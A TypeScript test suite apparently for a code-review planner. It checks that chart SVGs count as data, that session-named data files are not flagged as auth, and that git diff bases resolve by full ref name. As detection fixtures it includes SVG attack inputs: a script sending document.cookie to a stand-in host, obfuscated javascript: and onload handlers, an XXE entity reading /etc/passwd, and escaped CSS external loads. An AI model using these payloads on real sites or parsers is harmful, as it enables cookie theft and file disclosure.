/**
 * Three /ship planner misreads from GST-911 (gstack-evals#132, a results write-up) and GST-884:
 * a plotting-script SVG counted as runtime code, a data file named for sessions read as auth code, and
 * gstack-diff-scope (plus the receipt depth) resolving a bare base name, so a stale local main or a tag
 * named main or origin/main moved the diff. Every real signal stays: an SVG that can run code is
 * security, session code is auth, and a credential reference is a secret wherever it is.
 */
import { afterEach, describe, expect, test } from 'bun:test';
import { spawnSync } from 'node:child_process';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { collectCommit, collectLive } from '../lib/review-collect';
import { depthOfCommitInput, svgDrawing } from '../lib/review-depth';
import { targetedClasses } from '../lib/review-targeted';
import { receiptDepthAtHead, receiptDepthVerdict } from '../lib/ship-receipt-depth';

const BIN = path.join(import.meta.dir, '..', 'bin');
const SCOPE = path.join(BIN, 'gstack-diff-scope');
const dirs: string[] = [];
afterEach(() => { while (dirs.length) fs.rmSync(dirs.pop()!, { recursive: true, force: true }); });

function fixture() {
  const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'planner-misreads-')));
  dirs.push(root);
  const work = path.join(root, 'work');
  const env = { ...process.env, GSTACK_STATE_ROOT: path.join(root, 'state'), GIT_AUTHOR_NAME: 't', GIT_AUTHOR_EMAIL: 't@t', GIT_COMMITTER_NAME: 't', GIT_COMMITTER_EMAIL: 't@t', GIT_CONFIG_GLOBAL: path.join(root, 'gitconfig'), GIT_CONFIG_NOSYSTEM: '1' };
  fs.writeFileSync(path.join(root, 'gitconfig'), '[commit]\n\tgpgsign = false\n[init]\n\tdefaultBranch = main\n');
  const sh = (cwd: string, c: string) => { const r = spawnSync('bash', ['-c', c], { cwd, env, encoding: 'utf8', timeout: 60_000 }); if (r.status !== 0) throw new Error(`${c}: ${r.stderr}`); return r.stdout.trim(); };
  sh(root, 'git init -q --bare origin.git && git clone -q origin.git work 2>/dev/null');
  const write = (files: Record<string, string>) => { for (const [p, text] of Object.entries(files)) { const f = path.join(work, p); fs.mkdirSync(path.dirname(f), { recursive: true }); fs.writeFileSync(f, text); } };
  const commit = (files: Record<string, string>) => { write(files); sh(work, 'git add -A && git commit -qm change'); return sh(work, 'git rev-parse HEAD'); };
  write({ 'README.md': '# evals\n', 'src/run.ts': 'export const run = () => 1;\n' });
  sh(work, 'git add -A && git commit -qm base && git push -q origin main && git checkout -qb feat');
  const base = sh(work, 'git rev-parse HEAD');
  const scope = (args: string[]) => {
    const r = spawnSync('bash', [SCOPE, ...args], { cwd: work, env, encoding: 'utf8', timeout: 30_000 });
    return { status: r.status, out: r.stdout, vars: Object.fromEntries(r.stdout.split('\n').filter(l => /^SCOPE_\w+=/.test(l)).map(l => l.split('=') as [string, string])) };
  };
  return { root, work, env, sh, write, commit, base, scope };
}

/** A matplotlib-style chart: XML declaration, DOCTYPE, RDF metadata, CSS, markers by internal reference, a clip path. */
const chart = (points: number, extra = '') => [
  '<?xml version="1.0" encoding="utf-8" standalone="no"?>',
  '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"',
  '  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">',
  '<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="460.8pt" height="345.6pt" viewBox="0 0 460.8 345.6" xmlns="http://www.w3.org/2000/svg" version="1.1">',
  ' <metadata>',
  '  <rdf:RDF xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:cc="http://creativecommons.org/ns#" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">',
  '   <cc:Work>',
  '    <dc:type rdf:resource="http://purl.org/dc/dcmitype/StillImage"/>',
  '    <dc:date>2026-10-31T12:00:00</dc:date>',
  '    <dc:format>image/svg+xml</dc:format>',
  '    <dc:creator>',
  '     <cc:Agent>',
  '      <dc:title>Matplotlib v3.9.2, https://matplotlib.org/</dc:title>',
  '     </cc:Agent>',
  '    </dc:creator>',
  '   </cc:Work>',
  '  </rdf:RDF>',
  ' </metadata>',
  ' <defs>',
  '  <style type="text/css">*{stroke-linejoin: round; stroke-linecap: butt}</style>',
  '  <path id="m0" d="M 0 3 C 0.8 3 1.5 2.7 2.1 2.1 z" style="stroke: #1f77b4"/>',
  ' </defs>',
  ' <g id="figure_1">',
  '  <g id="patch_1">',
  '   <path d="M 0 345.6 L 460.8 345.6 L 460.8 0 L 0 0 z" style="fill: #ffffff"/>',
  '  </g>',
  ...Array.from({ length: points }, (_, i) => `   <use xlink:href="#m0" x="${57 + i}" y="${300 - ((i * 7) % 250)}" style="fill: #1f77b4; stroke: #1f77b4" clip-path="url(#p1)"/>`),
  '  <g id="text_1">',
  '   <text x="230" y="20" style="font-size: 12px; font-family: DejaVu Sans">cost per run &amp; pass rate</text>',
  '  </g>',
  ...(extra ? [extra] : []),
  ' </g>',
  ' <defs>',
  '  <clipPath id="p1">',
  '   <rect x="57.6" y="41.472" width="357.12" height="266.112"/>',
  '  </clipPath>',
  ' </defs>',
  '</svg>',
  '',
].join('\n');

const plan = (fx: ReturnType<typeof fixture>, head: string) => {
  const c = collectCommit(fx.work, fx.base, head);
  const d = depthOfCommitInput({ ...c, gateTagged: 0 });
  return { class: d.class, depth: d.depth, runtime: d.runtimeLines, risk: d.risk };
};

describe('GST-911 misread 1: a chart SVG is data, an SVG that can run code is security', () => {
  // Value: protects=a results write-up whose chart is an SVG plans like the same chart as a PNG (docs, light, no runtime lines);
  //   fails_when=an SVG with only drawing elements, internal references and CSS counts as runtime code; seam=collectCommit + depthOfCommitInput, collectLive
  test('a plotting-script SVG no code names plans as docs, light, runtime 0, like the PNG', () => {
    const fx = fixture();
    const svg = plan(fx, fx.commit({ 'results/2026-10-31/chart.svg': chart(600), 'results/2026-10-31/README.md': '# Results\n\n![chart](chart.svg)\n' }));
    expect(svg).toEqual({ class: 'docs', depth: 'light', runtime: 0, risk: [] });
    fx.sh(fx.work, 'git rm -q results/2026-10-31/chart.svg && git commit -qm drop');
    const png = plan(fx, fx.commit({ 'results/2026-10-31/chart.png': '\x89PNG\r\n\x1a\n\0\0\0\rIHDR' }));
    expect(png).toEqual({ class: 'docs', depth: 'light', runtime: 0, risk: [] });
    fx.write({ 'results/live/chart.svg': chart(40) });
    const live = collectLive(fx.work, 'main');
    expect(depthOfCommitInput({ ...live, gateTagged: 0 }).runtimeLines).toBe(0);
  }, 60_000);

  // Value: protects=an SVG that can execute script stays code and gets the security class (full depth), however it spells the script;
  //   fails_when=a script element, a namespaced script, an event handler, a javascript: URL (plain, entity-encoded or zero-padded) or a
  //   foreignObject plans as docs or loses the security class, or a handler or URL split across lines loses it; seam=collectCommit + depthOfCommitInput
  test.each([
    ['a script element', '  <script>fetch("https://x.test/?c=" + document.cookie)</script>'],
    ['a namespaced script', '  <s:script xmlns:s="http://www.w3.org/2000/svg">window.x = 42</s:script>'],
    ['an event handler', '  <rect width="10" height="10" onload="alert(1)"/>'],
    ['a javascript: URL', '  <a xlink:href="javascript:alert(1)"><text>x</text></a>'],
    ['an entity-encoded javascript: URL', '  <a href="&#106;avascript&#58;alert(1)"><text>x</text></a>'],
    ['a foreignObject', '  <foreignObject width="10" height="10"><div xmlns="http://www.w3.org/1999/xhtml">x</div></foreignObject>'],
    ['a zero-padded javascript: URL', '  <a href="&#0000000000106;avascript:alert(1)"><text>x</text></a>'],
    ['an event handler split across lines', '  <rect width="10" onload\n    ="alert(1)"/>'],
    ['a javascript: URL split across lines', '  <a href="java\nscript:alert(1)"><text>x</text></a>'],
  ])('%s stays code with the security class', (_name, line) => {
    const fx = fixture();
    expect(plan(fx, fx.commit({ 'results/chart.svg': chart(5, line) }))).toMatchObject({ class: 'code', depth: 'full', risk: ['security'] });
  }, 60_000);

  // Value: protects=only an SVG made of drawing elements is data: anything that loads, links or declares outside that set stays code;
  //   fails_when=an external image or stylesheet, an entity declaration, an external DTD, an animation or a CSS url() to another document reads as docs,
  //   including through a CSS escape or a zero-padded character reference (review pass 1 findings) or behind a stray quote that
  //   pairs with a later one (review pass 2 finding), or any CSS beyond declarations and url(#id) (Step 11 finding: image-set()),
  //   including CSS behind a character-reference </style> or comment, an HTML-only comment end, a quoted > on the style tag, a
  //   non-ASCII space before > in </style>, or a tag or attribute under a non-ASCII namespace prefix (GST-940);
  //   seam=collectCommit + depthOfCommitInput
  test.each([
    ['an external image', '  <image href="https://x.test/pixel.png" width="1" height="1"/>'],
    ['a CSS import', '  <style>@import url("https://x.test/a.css");</style>'],
    ['a CSS url() to another document', '  <rect style="fill: url(https://x.test/a.svg#g)"/>'],
    ['an animation', '  <animate attributeName="x" from="0" to="10" dur="1s"/>'],
    ['a stylesheet processing instruction', '<?xml-stylesheet href="https://x.test/a.css"?>'],
    ['an entity declaration', '<!DOCTYPE svg [ <!ENTITY e SYSTEM "file:///etc/passwd"> ]>'],
    ['an external DTD', '<!DOCTYPE svg SYSTEM "https://x.test/a.dtd">'],
    ['an external DTD behind the SVG public identifier', '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "https://x.test/a.dtd">'],
    ['a CSS-escaped import', '  <style>@\\69mport "https://x.test/a.css";</style>'],
    ['a CSS-escaped url()', '  <rect style="fill: u\\72l(https://x.test/a.svg#g)"/>'],
    ['a zero-padded character reference import', '  <style>@&#0000000000105;mport "https://x.test/a.css";</style>'],
    ['a zero-padded hex character reference url()', '  <rect style="fill: u&#x0000000072;l(https://x.test/a.svg#g)"/>'],
    ['an external image after a stray quote in text', "  <text>z='</text><image href=\"https://x.test/p.png\"/><text>'</text>"],
    ['an external use after a stray quote in a comment', "  <!-- z=' --><use href=\"https://x.test/o.svg#a\"/><!-- ' -->"],
    ['an external xlink:href after a stray quote in a desc', "  <desc>z='</desc><image xlink:href=\"https://x.test/p.png\"/><desc>'</desc>"],
    ['an external image after a stray href in text', "  <text>href='#</text><image href=\"https://x.test/p.png\"/><text>'</text>"],
    ['a CSS image-set() in a style element', '  <style>rect{fill:image-set("https://x.test/p.png" 1x)}</style>'],
    ['a CSS image-set() in a style attribute', "  <rect style=\"fill:-webkit-image-set('https://x.test/p.png' 1x)\"/>"],
    ['a CSS image() with a string', '  <style>rect{fill:image("https://x.test/p.png")}</style>'],
    ['a CSS element() reference', '  <rect style="fill:element(#m0)"/>'],
    ['a CSS import of a bare string', '  <style>@import "https://x.test/a.css";</style>'],
    ['a style element import', '  <style>@import url("https://x.test/a.css");</style>'],
    ['a style attribute cross-fade()', '  <rect style="fill:cross-fade(url(https://x.test/a.png), url(#m0), 50%)"/>'],
    ['a style element whose </style> hides in a comment', '  <style>svg{fill:<!-- </style> -->image-set("https://x.test/p.png" 1x)}</style>'],
    ['a style element whose </style> hides in CDATA', '  <style><![CDATA[ /* </style> */ svg{fill:image-set("https://x.test/p.png" 1x)} ]]></style>'],
    ['a character-reference </style> in a style element', '  <style>&#60;/style>rect{fill:image-set("https://x.test/p.png" 1x)}</style>'],
    ['a hex character-reference </style> in a style element', '  <style>&#x3C;/style>rect{fill:image-set("https://x.test/p.png" 1x)}</style>'],
    ['a character-reference comment in a style element', '  <style>&#60;!-- rect{fill:image-set("https://x.test/p.png" 1x)} --></style>'],
    ['CSS after an HTML empty comment in a style element', '  <style><!-->rect{fill:image-set("https://x.test/p.png" 1x)}--></style>'],
    ['CSS after an HTML --!> comment end in a style element', '  <style><!-- --!>rect{fill:image-set("https://x.test/p.png" 1x)} --></style>'],
    ['a </style> inside a quoted style attribute', '  <style title="></style>">rect{fill:image-set("https://x.test/p.png" 1x)}</style>'],
    ['an escaped ampersand in a style element', '  <style>text{font-family:"A &amp; B"}</style>'],
    ['a no-break space before > in </style>', '  <style>a{}</style\u00a0>rect{fill:image-set("https://x.test/p.png" 1x)}</style>'],
    ['a vertical tab before > in </style>', '  <style>a{}</style\u000b>rect{fill:image-set("https://x.test/p.png" 1x)}</style>'],
    ['a script under a non-ASCII prefix', '  <g\u00e9:script xmlns:g\u00e9="http://www.w3.org/2000/svg">fetch(1)</g\u00e9:script>'],
    ['a style under a non-ASCII prefix', '  <g\u00e9:style xmlns:g\u00e9="http://www.w3.org/2000/svg">rect{fill:image-set("https://x.test/p.png" 1x)}</g\u00e9:style>'],
    ['an external href under a non-ASCII prefix', '  <image x\u00e9:href="https://x.test/p.png" xmlns:x\u00e9="http://www.w3.org/1999/xlink"/>'],
  ])('%s keeps the SVG code', (_name, line) => {
    const fx = fixture();
    expect(plan(fx, fx.commit({ 'results/chart.svg': chart(5, line) })).class).toBe('code');
  }, 60_000);

  // Value: protects=the GST-940 style walker still reads a plain chart style as a drawing: a comment, CDATA and a quoted attribute
  //   without markup; fails_when=the walker over-refuses them, so chart SVGs lose the light review; seam=svgDrawing
  test('a style comment, CDATA and quoted attribute keep a chart a drawing (GST-940)', () => {
    expect(svgDrawing(chart(5, '  <style type="text/css" media="all"><!-- plot --><![CDATA[ rect{fill:#000} ]]></style>'))).toBe(true);
  });

  // Value: protects=a passive edit to an SVG that already carries a script is still code, because the whole file decides, not the
  //   changed lines; and an SVG code names stays code like any consumed data file; fails_when=either plans as docs; seam=collectCommit
  test('an edit inside a scripted SVG, and an SVG code names, stay code', () => {
    const fx = fixture();
    fx.commit({ 'assets/live.svg': chart(5, '  <script>window.x = 1</script>') });
    fx.sh(fx.work, 'git checkout -q main && git merge -q --ff-only feat && git checkout -q feat');
    const scripted = { ...fx, base: fx.sh(fx.work, 'git rev-parse HEAD') };
    expect(plan(scripted, fx.commit({ 'assets/live.svg': chart(6, '  <script>window.x = 1</script>') })).class).toBe('code');
    const named = plan(fx, fx.commit({ 'assets/icon.svg': chart(3), 'src/icon.ts': "export const icon = new URL('./icon.svg', import.meta.url);\n" }));
    expect(named.class).toBe('code');
    expect(named.runtime).toBeGreaterThan(3);
  }, 60_000);

  // Value: protects=the drawing check reads a file up to the collector's 8 MB cap in linear time; fails_when=a run of unclosed
  //   style tags (480 KB) takes over 100 ms or reads as a drawing (review pass notes on #3838); seam=svgDrawing
  test('a 480 KB run of unclosed <style tags is refused in under 100 ms', () => {
    const svg = '<svg xmlns="http://www.w3.org/2000/svg">' + '<style'.repeat(80_000);
    const t0 = performance.now();
    expect(svgDrawing(svg)).toBe(false);
    expect(performance.now() - t0).toBeLessThan(100);
  });

  // Value: protects=every verdict holds at 1 MB and 8 MB, the collector's cap: a long drawing stays data and a load placed after
  //   a long run of CSS, base64 or text is still refused (JavaScriptCore has returned no match on a quantified group over
  //   megabytes before, GST-898); fails_when=any verdict flips at size; seam=svgDrawing
  test.each([1_000_000, 8_000_000])('verdicts hold at %d characters', size => {
    const H = '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">';
    const bad = 'image-set("https://x.test/p.png" 1x)';
    const fill = (unit: string) => unit.repeat(Math.ceil(size / unit.length));
    expect(svgDrawing(H + '<defs><style type="text/css">*{stroke-linejoin: round}</style></defs>' + fill('<use xlink:href="#m0" x="5" style="fill: #1f77b4" clip-path="url(#p1)"/>') + '</svg>')).toBe(true);
    expect(svgDrawing(H + '<image href="data:image/png;base64,' + fill('AAAA') + '"/></svg>')).toBe(true);
    for (const svg of [
      H + fill('<rect x="1" style="fill: #1f77b4"/>') + '<style>rect{fill:' + bad + '}</style></svg>',
      H + '<rect style="' + fill('fill: #000; ') + 'fill:' + bad + '"/></svg>',
      H + '<style>' + fill('rect{fill:#000} ') + 'svg{fill:' + bad + '}</style></svg>',
      H + '<style><![CDATA[ /* </style> */ ' + fill('rect{fill:#000} ') + 'svg{fill:' + bad + '} ]]></style></svg>',
      H + '<style>' + fill('rect{fill:#000} ') + '<!-- </style> -->svg{fill:' + bad + '}</style></svg>',
      H + '<image href="data:image/png;base64,' + fill('AAAA') + '"/><image href="https://x.test/p.png"/></svg>',
      H + "<text>z='" + fill('abc ') + "</text><image href=\"https://x.test/p.png\"/><text>'</text></svg>",
      H + fill('<style'),
    ]) expect(svgDrawing(svg)).toBe(false);
  }, 60_000);
});

describe('GST-911 misread 2: a data file named for sessions is not auth', () => {
  // Value: protects=a data file whose name says session never sets SCOPE_AUTH, while session code and session config still do;
  //   fails_when=recovered-sessions.jsonl sets SCOPE_AUTH, or session.ts, a session store, a sessions controller or config/sessions.json stop setting it;
  //   seam=bin/gstack-diff-scope
  test('gstack-diff-scope: session data files are not auth; session code and config are', () => {
    for (const [file, auth] of [
      ['results/recovered-sessions.jsonl', 'false'], ['data/sessions.csv', 'false'], ['logs/session-costs.json', 'false'], ['shots/session.PNG', 'false'],
      ['src/auth/session.ts', 'true'], ['lib/session-store.ts', 'true'], ['app/controllers/sessions_controller.rb', 'true'], ['config/sessions.json', 'true'],
      ['.github/session.json', 'true'], ['app/.session.json', 'true'], ['session.config.json', 'true'], ['data/oauth-tokens.json', 'true'],
    ] as const) {
      const fx = fixture();
      fx.commit({ [file]: '{"a": 1}\n', 'src/run.ts': 'export const run = () => 2;\n' });
      expect([file, fx.scope(['main']).vars.SCOPE_AUTH]).toEqual([file, auth]);
    }
  }, 120_000);

  // Value: protects=the planner adds no auth reader and no gate class for a session-named data file, and a credential in it is still a secret;
  //   fails_when=targetedClasses returns auth for recovered-sessions.jsonl next to a code change, classifyDiff raises it to gate through SCOPE_AUTH,
  //   or the secret class misses an env key reference in that file; seam=gstack-diff-scope + collectCommit + targetedClasses + depthOfCommitInput
  test('the planner: no auth class and no gate for session rows; real session code is auth; a key reference is a secret', () => {
    const fx = fixture();
    const rows = Array.from({ length: 20 }, (_, i) => `{"run": ${i}, "tokens": ${1000 + i}}`).join('\n') + '\n';
    const run = (files: Record<string, string>) => {
      const head = fx.commit(files);
      const c = collectCommit(fx.work, fx.base, head);
      const scope = fx.scope(['main', '--head', head]).vars;
      return { targeted: targetedClasses({ ...c, scope, gateTagged: 0 }).classes, class: depthOfCommitInput({ ...c, scope, gateTagged: 0 }).class };
    };
    expect(run({ 'results/recovered-sessions.jsonl': rows, 'src/run.ts': 'export const run = () => 3;\n' })).toEqual({ targeted: [], class: 'code' });
    expect(run({ 'lib/session-store.ts': 'export const cookie = (sid: string) => `sid=${sid}; HttpOnly`;\n' })).toEqual({ targeted: ['auth'], class: 'gate' });
    expect(run({ 'results/recovered-sessions.jsonl': rows + '{"key": "${OPENAI_API_KEY}"}\n' }).targeted).toEqual(['auth', 'secret']);
  }, 120_000);
});

describe('GST-884: gstack-diff-scope and the receipt depth read origin/<base> by its full ref name', () => {
  function staleFixture() {
    const fx = fixture();
    fx.sh(fx.root, 'git clone -q origin.git other && cd other && mkdir -p db/migrate && echo "create table t;" > db/migrate/001.sql && git add -A && git commit -qm upstream && git push -q origin main');
    fx.sh(fx.work, 'git fetch -q origin && git checkout -q -B feat origin/main && echo "a{}" > styles.css && git add -A && git commit -qm feat');
    return fx;
  }

  // Value: protects=a local main behind origin/main never adds upstream files to the scope; fails_when=gstack-diff-scope diffs against the
  //   stale local main and reports SCOPE_MIGRATIONS for a migration the branch only inherited; seam=bin/gstack-diff-scope
  test('a stale local main scopes the same as a fresh one', () => {
    const fx = staleFixture();
    expect(fx.sh(fx.work, 'git merge-base main HEAD')).not.toBe(fx.sh(fx.work, 'git merge-base origin/main HEAD'));
    const stale = fx.scope(['main']);
    fx.sh(fx.work, 'git branch -f main origin/main');
    const fresh = fx.scope(['main']);
    expect(fresh.vars).toMatchObject({ SCOPE_FRONTEND: 'true', SCOPE_MIGRATIONS: 'false' });
    expect(stale.out).toBe(fresh.out);
  }, 60_000);

  // Value: protects=a tag named main or origin/main cannot stand in for the branch and hide the change; fails_when=gstack-diff-scope resolves
  //   the base by its short name while a tag of that name exists at HEAD (an empty scope); seam=bin/gstack-diff-scope
  for (const [tag, arg] of [['main', 'main'], ['origin/main', 'main'], ['origin/main', 'origin/main']] as const) {
    test(`a tag named ${tag} at HEAD does not shadow the base ${arg}`, () => {
      const fx = staleFixture();
      fx.sh(fx.work, 'git branch -f main origin/main');
      const before = fx.scope([arg]);
      fx.sh(fx.work, `git tag '${tag}' HEAD`);
      const after = fx.scope([arg]);
      expect(before.vars.SCOPE_FRONTEND).toBe('true');
      expect(after.out).toBe(before.out);
      const head = fx.sh(fx.work, 'git rev-parse HEAD');
      expect(fx.scope([arg, '--head', head]).out).toBe(before.out);
    }, 60_000);
  }

  // Value: protects=the receipt's depth and the queue's recomputation diff against refs/remotes/origin/<base>, never a tag named origin/main;
  //   fails_when=receiptDepthAtHead or receiptDepthVerdict rev-parse the short name origin/<base>; seam=lib/ship-receipt-depth.ts
  test('a tag named origin/main does not move the receipt depth base', () => {
    const fx = staleFixture();
    const origin = fx.sh(fx.work, 'git rev-parse refs/remotes/origin/main');
    const head = fx.sh(fx.work, 'git rev-parse HEAD');
    fx.sh(fx.work, "git tag 'origin/main' HEAD && git tag main HEAD");
    const stub = path.join(fx.root, 'stub-bin');
    fs.mkdirSync(stub);
    fs.writeFileSync(path.join(stub, 'gstack-diff-scope'), '#!/bin/sh\nexit 0\n', { mode: 0o755 });
    fs.writeFileSync(path.join(stub, 'gstack-gate-diff'), '#!/bin/sh\nexit 1\n', { mode: 0o755 });
    expect(receiptDepthAtHead(fx.work, 'main', stub, head).base).toBe(origin);
    const verdict = receiptDepthVerdict(fx.work, 'origin/main', { gstack_version: '1.0.0', review_depth: { depth: 'full', gate_scan: { tagged: 0, head } } } as any, head);
    expect(verdict.line).toContain(`inputs=base@${origin.slice(0, 12)}`);
    expect(verdict.line).toContain('class=code');
  }, 60_000);
});
